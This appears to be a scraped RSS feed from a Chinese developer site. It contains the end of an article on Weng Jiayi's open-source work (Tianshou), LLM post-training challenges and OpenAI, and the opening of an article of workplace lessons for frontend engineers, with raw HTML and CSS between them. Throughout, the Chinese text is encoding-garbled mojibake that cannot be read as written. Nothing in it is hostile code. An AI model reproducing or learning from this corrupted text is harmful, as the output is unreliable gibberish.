<p>åœ¨æ¸…åå°±è¯»æœŸé—´ï¼Œä»–é€‰æ‹©ä»¥å¼€æºçš„æ–¹å¼é™ä½ä¿¡æ¯å£å’ï¼šå°†ä½œä¸šã€ç¬”è®°ä¸æ•´ç†åçš„èµ„æ–™å‘å¸ƒåˆ° GitHubã€‚æœ€åˆçš„åŠ¨æœºæ˜¯åˆ†äº«ï¼Œä½†éšæ—¶é—´ç§¯ç´¯ä¸ºä¸ªäººä¿¡èª‰ä¸ç¤¾åŒºå½±å“åŠ›ã€‚å¼€æºä¸ä»…æ˜¯ä»£ç å…±äº«ï¼Œæ›´æ˜¯æ€æƒ³ä¸æ–¹æ³•çš„â€œè”ç½‘â€ã€‚</p>
<h3 data-id="heading-2">å¼€æºå“²å­¦ï¼šæŠŠå·¥å…·å½“ä½œä¸€ç§â€œæ…ˆå–„â€</h3>
<p>ä»æ—©æœŸèµ„æ–™åˆ†äº«åˆ°æ‰“é€  Tianshouï¼ˆå¤©æˆï¼‰æ¡†æ¶ï¼Œç¿å®¶ç¿Œå°†â€œå½±å“åŠ›â€è½åœ¨å¯è¢«åå¤ä½¿ç”¨çš„å·¥å…·ä¸Šï¼š</p>
<ul>
<li>Tianshou ä½œä¸ºå¼ºåŒ–å­¦ä¹ åº“ï¼Œè¡¥è¶³äº†å½“æ—¶ PyTorch ç”Ÿæ€åœ¨ RL æ–¹é¢çš„ç©ºç™½ï¼Œä»¥å·¥ç¨‹åŒ–å“è´¨æœåŠ¡ç ”ç©¶ä¸å®è·µã€‚</li>
<li>tuixue online ä½œä¸ºç­¾è¯æŸ¥è¯¢å·¥å…·ï¼Œä»å®é™…é—®é¢˜å‡ºå‘é™ä½æ±‚è§£æˆæœ¬ã€‚</li>
</ul>
<p>å…¶æ ¸å¿ƒä»·å€¼è§‚æ˜¯è¿½æ±‚ Impactï¼ˆå½±å“åŠ›ï¼‰ï¼šå·¥ä½œæ˜¯å¦åˆ‡å®è§£å†³é—®é¢˜ã€èŠ‚çº¦ç¤¾ä¼šæ€»æˆæœ¬ã€‚æŠŠå†™ä»£ç ã€åšå·¥å…·å½“ä½œâ€œå…¬å…±åŸºç¡€è®¾æ–½â€çš„å»ºè®¾ï¼Œæ„æˆäº†é•¿æœŸçš„ä¸ªäººæŠ¤åŸæ²³ã€‚</p>
<h3 data-id="heading-3">å¼ºåŒ–å­¦ä¹ ä¸åè®­ç»ƒï¼šå®šä¹‰ä¸æŒ‘æˆ˜</h3>
<p>åœ¨å¤§æ¨¡å‹å·¥ä¸šåŒ–åœºæ™¯ä¸­ï¼Œåè®­ç»ƒï¼ˆPost-trainingï¼‰æ˜¯æ‰¿æ¥é¢„è®­ç»ƒèƒ½åŠ›å¹¶å¯¹é½äººç±»åå¥½çš„å…³é”®é˜¶æ®µã€‚</p>
<p><strong>å…³é”®æœ¯è¯­è§£æ</strong></p>
<ul>
<li><strong>é¢„è®­ç»ƒï¼ˆPre-trainingï¼‰</strong>ï¼šè®©æ¨¡å‹ä¹ å¾—æµ·é‡ä¸–ç•ŒçŸ¥è¯†ï¼Œè§£å†³â€œæ‡‚ä¸æ‡‚â€ã€‚</li>
<li><strong>åè®­ç»ƒï¼ˆPost-trainingï¼‰</strong>ï¼šæ¿€å‘æ¨¡å‹èƒ½åŠ›å¹¶å¯¹é½äººç±»ä»·å€¼è§‚ï¼Œè§£å†³â€œå¥½ä¸å¥½ç”¨â€ã€‚</li>
<li><strong>RLHFï¼ˆReinforcement Learning from Human Feedbackï¼‰</strong>ï¼šä»¥äººç±»åé¦ˆä¸ºä¿¡å·ï¼Œé€šè¿‡å¼ºåŒ–å­¦ä¹ ä¼˜åŒ–æ¨¡å‹è¡Œä¸ºã€‚</li>
</ul>
<p>ç„¶è€Œï¼Œå°†è¿™äº›æ–¹æ³•ä»å®éªŒå®¤æ¨å‘å·¥ä¸šçº§ï¼Œè¿˜é¢ä¸´ä¸‰ç±»æ ¸å¿ƒæŒ‘æˆ˜ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc866b8f9cc44511a5c9194e5339d35c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWvllYo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478877&amp;x-signature=CTQWuOdByDjCyjuE5Wvkv2CGfp0%3D" alt="image2.png" loading="lazy"/></p>
<p><em>å·¥ä¸šçº§åè®­ç»ƒçš„ä¸‰ç±»æŒ‘æˆ˜ï¼ˆç¤ºæ„ï¼‰ï¼šæ•°æ®ä¸åå¥½å»ºæ¨¡ã€ç®—æ³•ç¨³å®šæ€§ã€è§„æ¨¡åŒ–åŸºç¡€è®¾æ–½</em></p>
<ol>
<li><strong>æ•°æ®ä¸åå¥½å»ºæ¨¡çš„å¤æ‚æ€§</strong>ï¼šäººç±»åå¥½æ¨¡ç³Šä¸”éš¾é‡åŒ–ï¼Œæ„å»ºé«˜è´¨é‡å¥–åŠ±æ¨¡å‹ï¼ˆReward Modelï¼‰æ˜¯é¦–è¦éš¾é¢˜ã€‚</li>
<li><strong>ç®—æ³•çš„ç¨³å®šæ€§</strong>ï¼šå¼ºåŒ–å­¦ä¹ å¯¹è¶…å‚æ•°æ•æ„Ÿï¼Œæ˜“å‡ºç°ä¸æ”¶æ•›æˆ–æ€§èƒ½éœ‡è¡ï¼›åœ¨è¶…å¤§è§„æ¨¡è®­ç»ƒä¸­é—®é¢˜è¢«æ”¾å¤§ã€‚</li>
<li><strong>è§„æ¨¡åŒ–åŸºç¡€è®¾æ–½ï¼ˆInfraï¼‰</strong>ï¼šå½“å‚æ•°é‡ä¸å¹¶å‘è§„æ¨¡å¾ˆå¤§æ—¶ï¼ŒGPU ååŒã€åˆ†å¸ƒå¼é€šä¿¡ä¸å¯å¤ç°å®éªŒè¿­ä»£æˆä¸ºå†³å®šå› ç´ ã€‚</li>
</ol>
<h3 data-id="heading-4">ç»„ç»‡ä¸äº§å“ï¼šäººæ‰å¯†åº¦ä¸ç¡®å®šæ€§</h3>
<p>2022 å¹´åŠ å…¥ OpenAI çš„ç›´è§‚æ„Ÿå—æ˜¯äººæ‰å¯†åº¦é«˜ã€å±‚çº§æ‰å¹³ï¼Œä¸ªä½“èƒ½ç‹¬å½“ä¸€é¢ï¼Œæ²Ÿé€šæˆæœ¬ä½ã€‚å›é¡¾ ChatGPT çš„æˆåŠŸï¼Œå†…éƒ¨å¯¹ç¼©æ”¾å®šå¾‹ï¼ˆScaling Lawsï¼‰çš„ä¿¡å¿µä¸å¯¹å·¥ç¨‹æè‡´çš„è¿½æ±‚ï¼Œä½¿â€œè§„æ¨¡åŒ–è¿­ä»£ + é«˜å¯†åº¦å›¢é˜Ÿâ€æˆä¸ºèƒ½åŠ›æ¶Œç°çš„å¯é¢„è§å¼•æ“ã€‚</p>
<h3 data-id="heading-5">æœªæ¥è§‚å¯Ÿï¼šç“¶é¢ˆä¸æ–¹å‘</h3>
<p>æœªæ¥ 5â€“10 å¹´å€¼å¾—å…³æ³¨çš„æ–¹å‘ï¼š</p>
<ol>
<li><strong>æ¨ç†èƒ½åŠ›ï¼ˆReasoningï¼‰</strong>ï¼šçªç ´â€œæ¦‚ç‡é¢„æµ‹â€çš„å±€é™ï¼Œå‘æ›´æ·±å±‚çš„è§„åˆ’ä¸é€»è¾‘è¿ˆè¿›ã€‚</li>
<li><strong>ä¸–ç•Œæ¨¡å‹ï¼ˆWorld Modelsï¼‰</strong>ï¼šä»æ–‡æœ¬ç»Ÿè®¡èµ°å‘å¯¹ç‰©ç†ä¸–ç•Œæ›´çœŸå®çš„å»ºæ¨¡ï¼Œæ”¯æ’‘æœºå™¨äººä¸å®ä½“ç»æµã€‚</li>
<li><strong>æ•°æ®è´¨é‡ä¸äº¤äº’å¼å­¦ä¹ </strong>ï¼šåœ¨é«˜è´¨é‡æ–‡æœ¬è¶‹äºæ¯ç«­èƒŒæ™¯ä¸‹ï¼Œåˆ©ç”¨åˆæˆæ•°æ®ä¸ç¯å¢ƒäº¤äº’è·å–æ–°ä¿¡å·ã€‚</li>
<li><strong>æˆæœ¬ç»“æ„</strong>ï¼šé™ä½æ¨ç†æˆæœ¬ï¼Œè®©èƒ½åŠ›å¯è¢«å¹¿æ³›ã€å¯æŒç»­åœ°ä½¿ç”¨ã€‚</li>
</ol>
<h3 data-id="heading-6">å¼€æ”¾ä¸æ²»ç†çš„ç°å®è€ƒé¢˜</h3>
<p>å…³äºâ€œæ˜¯å¦è¶³å¤Ÿå¼€æ”¾â€çš„è®¨è®ºï¼Œæœ¬è´¨æ˜¯å¼€æ”¾ç ”ç©¶ä¸å®‰å…¨/å•†ä¸šåŒ–ä¹‹é—´çš„å¼ åŠ›ã€‚ä¸ºäº†å®ç°å®å¤§ä½¿å‘½ï¼Œå¿…é¡»ä¾èµ–ç®—åŠ›ä¸èµ„é‡‘æŠ•å…¥ï¼Œå•†ä¸šåŒ–æ˜¯å®ç°è·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚äººäº‹ä¸æµåŠ¨åœ¨é«˜é€Ÿå‘å±•ä¸­éš¾ä»¥é¿å…ï¼Œå…³é”®åœ¨äºæŠ€æœ¯è·¯çº¿ä¸æ²»ç†å®è·µèƒ½å¦æŒç»­æ¨è¿›ã€‚</p>
<h3 data-id="heading-7">è·¯å¾„å»ºè®®ï¼šç»™èµ°åœ¨è·¯ä¸Šçš„äºº</h3>
<p>ç»“åˆä¸ªäººç»å†ï¼Œç»™æŠ€æœ¯ä»ä¸šè€…çš„å‡ ç‚¹å»ºè®®ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d21536c20d646179af590753c5467b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWvllYo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478877&amp;x-signature=BDrZPCicUhQs%2Fs7BR37E12sdmPk%3D" alt="image3.png" loading="lazy"/></p>
<p><em>è¡ŒåŠ¨è·¯å¾„ï¼ˆç¤ºæ„ï¼‰ï¼šå·¥ç¨‹èƒ½åŠ›â€”å¼€æºæ æ†â€”é•¿æœŸä¸»ä¹‰</em></p>
<ul>
<li><strong>é‡è§†å·¥ç¨‹èƒ½åŠ›ï¼ˆEngineeringï¼‰</strong>ï¼šä¼˜ç§€ç®—æ³•ç¦»ä¸å¼€æ‰å®çš„å·¥ç¨‹ä¸åŸºç¡€è®¾æ–½èƒ½åŠ›ã€‚</li>
<li><strong>ç”¨å¼€æºå»ºç«‹æ æ†</strong>ï¼šé€šè¿‡é«˜è´¨é‡å¼€æºé¡¹ç›®æˆ–æŠ€æœ¯è¾“å‡ºç§¯ç´¯ä¿¡èª‰ä¸è¿æ¥ã€‚</li>
<li><strong>ä¿æŒé•¿æœŸä¸»ä¹‰</strong>ï¼šå›´ç»•æœ‰é•¿æœŸä»·å€¼çš„æ–¹å‘æ·±è€•ï¼Œä»¥ç³»ç»Ÿæ€§ç§¯ç´¯å¯¹æŠ—çŸ­æœŸç„¦è™‘ã€‚</li>
</ul>
<h3 data-id="heading-8">ç»“è¯­</h3>
<p>ä»æ¸…åå›­çš„å¼€æºå°‘å¹´åˆ°ç¡…è°·é£æš´ä¸­å¿ƒçš„ç ”ç©¶å®è·µè€…ï¼Œç¿å®¶ç¿Œçš„è·¯å¾„è¯´æ˜ï¼šæŒç»­åˆ†äº«ã€å·¥ç¨‹è½åœ°ä¸é•¿æœŸæŠ•å…¥ï¼Œèƒ½æ„æˆå¯æŒç»­çš„å½±å“åŠ›ï¼›ä¸å…¶è¿½é€é£å£ï¼Œä¸å¦‚æ‰“ç£¨å·¥å…·ã€è§£å†³çœŸæ­£é‡è¦çš„é—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å†™ç»™å‰ç«¯åŒå­¦çš„ 21 æ¡èŒåœºæ•™è®­]]></title>    <link>https://juejin.cn/post/7597653098563387446</link>    <guid>https://juejin.cn/post/7597653098563387446</guid>    <pubDate>2026-01-21T10:20:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597653098563387446" data-draft-id="7597641580104597558" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å†™ç»™å‰ç«¯åŒå­¦çš„ 21 æ¡èŒåœºæ•™è®­"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-21T10:20:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†´ç¾½"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å†™ç»™å‰ç«¯åŒå­¦çš„ 21 æ¡èŒåœºæ•™è®­
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†´ç¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T10:20:44.000Z" title="Wed Jan 21 2026 10:20:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¾ˆå¤šäººä»¥ä¸ºåœ¨å¤§å‚å·¥ä½œï¼Œå°±æ˜¯ä¸åœåœ°å†™ä»£ç ã€è§£å†³æŠ€æœ¯éš¾é¢˜ã€‚</p>
<p><strong>ä½†äº‹å®æ˜¯ï¼šçœŸæ­£æˆåŠŸçš„å·¥ç¨‹å¸ˆå¹¶ä¸æ˜¯é‚£äº›ä»£ç å†™å¾—æœ€å¥½çš„äººï¼Œè€Œæ˜¯é‚£äº›è§£å†³äº†ä»£ç ä»¥å¤–äº‹æƒ…çš„äººã€‚</strong></p>
<p>æœ¬ç¯‡å’Œä½ åˆ†äº« 21 æ¡èŒåœºæ•™è®­ã€‚</p>
<p>è¿™äº›æ•™è®­ï¼Œæœ‰çš„èƒ½è®©ä½ å°‘èµ°å‡ ä¸ªæœˆçš„å¼¯è·¯ï¼Œæœ‰çš„åˆ™éœ€è¦æ•°å¹´æ‰èƒ½å®Œå…¨é¢†æ‚Ÿã€‚</p>
<p>å®ƒä»¬éƒ½ä¸å…·ä½“çš„æŠ€æœ¯æ— å…³ï¼Œå› ä¸ºæŠ€æœ¯å˜åŒ–å¤ªå¿«ï¼Œæ ¹æœ¬æ— å…³ç´§è¦ã€‚</p>
<p>ä½†è¿™äº›æ•™è®­ï¼Œé¡¹ç›®æ¢äº†ä¸€ä¸ªåˆä¸€ä¸ªï¼Œå›¢é˜Ÿæ¢äº†ä¸€æ‰¹åˆä¸€æ‰¹ï¼Œå§‹ç»ˆåœ¨é‡å¤ä¸Šæ¼”ã€‚</p>
<p>å¸Œæœ›èƒ½å¸®åŠ©åˆ°ä½ ï¼š</p>
<h2 data-id="heading-0">1. æœ€ä¼˜ç§€çš„å·¥ç¨‹å¸ˆéƒ½ç—´è¿·äºè§£å†³ç”¨æˆ·é—®é¢˜</h2>
<p>å¾ˆå¤šäººå®¹æ˜“çˆ±ä¸Šä¸€é¡¹æ–°æŠ€æœ¯ï¼Œç„¶ååˆ°å¤„æ‰¾åœ°æ–¹ç”¨å®ƒã€‚</p>
<p>æˆ‘å¹²è¿‡ï¼Œä½ è‚¯å®šä¹Ÿå¹²è¿‡ã€‚</p>
<p>ä½†çœŸæ­£åˆ›é€ æœ€å¤§ä»·å€¼çš„å·¥ç¨‹å¸ˆæ˜¯åè¿‡æ¥çš„ï¼š</p>
<p><strong>ä»–ä»¬ä¸“æ³¨äºæ·±å…¥ç†è§£ç”¨æˆ·é—®é¢˜ï¼Œå¹¶è®©è§£å†³æ–¹æ¡ˆä»è¿™ç§ç†è§£ä¸­è‡ªç„¶è€Œç„¶åœ°æ¶Œç°ã€‚</strong></p>
<p>ä»¥ç”¨æˆ·ä¸ºä¸­å¿ƒæ„å‘³ç€èŠ±æ—¶é—´å¤„ç†æ”¯æŒå·¥å•ï¼Œä¸ç”¨æˆ·æ²Ÿé€šï¼Œè§‚å¯Ÿç”¨æˆ·é‡åˆ°çš„å›°éš¾ï¼Œä¸æ–­è¿½é—®â€œä¸ºä»€ä¹ˆâ€ï¼Œç›´åˆ°æ‰¾åˆ°é—®é¢˜çš„ç—‡ç»“æ‰€åœ¨ã€‚</p>
<p><strong>çœŸæ­£ç†è§£é—®é¢˜çš„å·¥ç¨‹å¸ˆå¾€å¾€ä¼šå‘ç°ï¼Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆæ¯”ä»»ä½•äººé¢„æƒ³çš„éƒ½è¦ç®€å•ã€‚</strong></p>
<p>å·¥ç¨‹å¸ˆå¦‚æœä¸€å¼€å§‹å°±æƒ³ç€å¦‚ä½•è§£å†³é—®é¢˜ï¼Œå¾€å¾€ä¼šä¸ºäº†å¯»æ‰¾ç†ç”±è€Œäººä¸ºåœ°å¢åŠ å¤æ‚æ€§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97054cdbd7094129bfdf2af5cee7c820~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=lyMseaBuI1HU1lzBEE2GDMKNajI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">2. æ­£ç¡®å¾ˆå®¹æ˜“ï¼Œå…±åŒè¾¾æˆæ­£ç¡®æ‰æ˜¯çœŸæ­£çš„æŒ‘æˆ˜</h2>
<p>å³ä½¿ä½ åœ¨æŠ€æœ¯ä¸Šèƒœåˆ¸åœ¨æ¡ï¼Œæœ€ç»ˆä¹Ÿå¯èƒ½è¾“æ‰é¡¹ç›®ã€‚</p>
<p>æˆ‘æ›¾äº²çœ¼ç›®ç¹ä¸€äº›æ‰åæ¨ªæº¢çš„å·¥ç¨‹å¸ˆï¼Œè‡ªè¯©ä¸ºæˆ¿é—´é‡Œæœ€èªæ˜çš„äººï¼Œä½†æ€»æ˜¯é»˜é»˜åœ°ç§¯æ”’æ€¨æ°”ã€‚æœ€ç»ˆè¡¨ç°ä¸ºâ€œè«åå…¶å¦™çš„æ‰§è¡Œé—®é¢˜â€å’Œâ€œè«åå…¶å¦™çš„é˜»åŠ›â€ã€‚</p>
<p><strong>å…³é”®ä¸åœ¨äºè¯æ˜è‡ªå·±æ­£ç¡®ï¼Œè€Œåœ¨äºå‚ä¸è®¨è®ºä»¥è¾¾æˆå¯¹é—®é¢˜çš„å…±è¯†ã€‚</strong></p>
<p>ä¸ºä»–äººåˆ›é€ å‘è¨€ç©ºé—´ï¼Œå¹¶å¯¹è‡ªå·±ç¡®ä¿¡çš„è§‚ç‚¹ä¿æŒæ€€ç–‘ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c483fd6b4aa74b4186317d8c829a1b88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=LQZMyQWnmfBH6ZrvibTydlcIj5w%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">3. è¡ŒåŠ¨ä¼˜å…ˆï¼Œå…ˆåšï¼Œå†åšå¯¹ï¼Œå†åšå¥½</h2>
<p>è¿½æ±‚å®Œç¾ä¼šè®©äººåœæ»ä¸å‰ã€‚</p>
<p>æˆ‘æ›¾ç»è§è¿‡å·¥ç¨‹å¸ˆèŠ±å‡ å‘¨è®¨è®ºä¸€ä¸ªä»æ²¡å»ºè¿‡çš„ä¸œè¥¿çš„ç†æƒ³æ¶æ„ã€‚</p>
<p>ä½†å®Œç¾çš„æ–¹æ¡ˆå¾ˆå°‘ä»æ€è€ƒä¸­äº§ç”Ÿï¼Œå®ƒéƒ½æ˜¯ä»ä¸ç°å®çš„ç¢°æ’ä¸­äº§ç”Ÿã€‚</p>
<p>å…ˆåšå‡ºæ¥ï¼Œå†åšå¯¹ï¼Œå†åšå¾—æ›´å¥½ã€‚</p>
<p>æŠŠä¸‘é™‹çš„åŸå‹æ”¾åˆ°ç”¨æˆ·é¢å‰ï¼Œå†™å‡ºä¹±ç³Ÿç³Ÿçš„æŠ€æœ¯æ–‡æ¡£åˆç¨¿ï¼Œå‘å¸ƒé‚£ä¸ªè®©ä½ æœ‰ç‚¹å°´å°¬çš„ MVPã€‚</p>
<p>ä»çœŸå®åé¦ˆä¸­å­¦åˆ°çš„å†…å®¹ï¼Œå“ªæ€•åªæœ‰ä¸€å‘¨ï¼Œä¹Ÿè¿œæ¯”ä¸€ä¸ªæœˆçš„ç†è®ºè¾©è®ºå¤šå¾—å¤šã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d82bd7927bcb4cf183a4fcdaaa074fde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=XVirlg11MCKhRO%2BS2KBfWShI9D4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">4. ä»£ç æ¸…æ™°è¿œæ¯”ç‚«æŠ€é‡è¦</h2>
<p>æˆ‘çŸ¥é“ä½ æƒ³è¦å†™å‡ºé…·ç‚«çš„ä»£ç ï¼Œé‚£å¯ä»¥è¯æ˜è‡ªå·±å¾ˆç‰›é€¼ã€‚</p>
<p>ä½†é¡¹ç›®å¾€å¾€ä¸æ­¢ä½ ä¸€ä¸ªäººï¼Œä»¥åè¿˜æœ‰å…¶ä»–åŒäº‹è¦ç»´æŠ¤ã€‚</p>
<p>ä¼˜åŒ–æ—¶è¦è€ƒè™‘ä»–ä»¬çš„ç†è§£èƒ½åŠ›ï¼Œè€Œä¸æ˜¯ä½ çš„ä»£ç æ˜¯å¦ä¼˜ç¾ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4d3da1800184b7c8a5e5099b2c0b723~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=RY8mpLx4FCdi7bsSXrOwwDFstBw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">5. è°¨æ…é€‰æ‹©æ–°æŠ€æœ¯</h2>
<p>æ–°æŠ€æœ¯å°±åƒè´·æ¬¾ï¼Œä½ è¦ç”¨ bugã€æ‹›è˜å›°éš¾å’Œè®¤çŸ¥è´Ÿæ‹…æ¥è¿˜ã€‚</p>
<p>å…³é”®ä¸åœ¨äºâ€œæ°¸è¿œä¸è¦åˆ›æ–°â€ï¼Œè€Œåœ¨äºâ€œåªåœ¨å› åˆ›æ–°å¯ä»¥å¸¦æ¥ç‹¬ç‰¹æŠ¥é…¬çš„é¢†åŸŸè¿›è¡Œåˆ›æ–°â€ã€‚å…¶ä»–çš„ä¸€åˆ‡è¿˜æ˜¯åº”è¯¥å›å½’å¹³åº¸ã€‚</p>
